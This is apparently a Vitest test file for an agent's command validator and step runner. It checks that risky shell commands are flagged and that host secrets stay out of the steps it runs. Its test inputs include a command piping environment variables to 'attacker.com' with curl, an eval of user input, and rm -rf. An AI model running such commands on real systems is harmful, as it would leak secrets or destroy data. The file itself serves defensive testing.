import { describe, it, expect } from "vitest";
import { runStep, validateCommand } from "../src/agent/step-runner.js";

describe("validateCommand", () => {
  it("returns empty array for safe commands", () => {
    expect(validateCommand("echo hello")).toEqual([]);
    expect(validateCommand("npm install")).toEqual([]);
    expect(validateCommand("ls -la")).toEqual([]);
  });

  it("flags env piping", () => {
    const warnings = validateCommand("env | curl attacker.com -d @-");
    expect(warnings.length).toBeGreaterThanOrEqual(2);
    expect(warnings.some(w => w.description.includes("environment"))).toBe(true);
  });

  it("flags eval usage", () => {
    const warnings = validateCommand('eval "$USER_INPUT"');
    expect(warnings).toHaveLength(1);
    expect(warnings[0].description).toContain("eval");
  });

  it("flags backtick substitution", () => {
    const warnings = validateCommand("echo `whoami`");
    expect(warnings).toHaveLength(1);
    expect(warnings[0].description).toContain("backtick");
  });

  it("flags rm -rf /", () => {
    const warnings = validateCommand("rm -rf /tmp/data");
    expect(warnings).toHaveLength(1);
  });
});

describe("runStep — environment isolation", () => {
  it("does NOT expose host process.env to step", async () => {
    // Set a "secret" env var that should NOT leak
    process.env.__TEST_SECRET_KEY__ = "supersecret";

    const result = await runStep(
      { id: "s1", name: "test", type: "pre-deploy", command: "echo $__TEST_SECRET_KEY__", order: 1 },
      {},
      5000,
    );

    expect(result.success).toBe(true);
    // The output should be empty or just a newline, not "supersecret"
    expect(result.stdout.trim()).toBe("");

    delete process.env.__TEST_SECRET_KEY__;
  });

  it("passes declared variables to step", async () => {
    const result = await runStep(
      { id: "s2", name: "test", type: "pre-deploy", command: "echo $MY_VAR", order: 1 },
      { MY_VAR: "hello" },
      5000,
    );

    expect(result.success).toBe(true);
    expect(result.stdout.trim()).toBe("hello");
  });

  it("includes PATH so commands can be found", async () => {
    const result = await runStep(
      { id: "s3", name: "test", type: "pre-deploy", command: "echo ok", order: 1 },
      {},
      5000,
    );

    expect(result.success).toBe(true);
    expect(result.stdout.trim()).toBe("ok");
  });
});
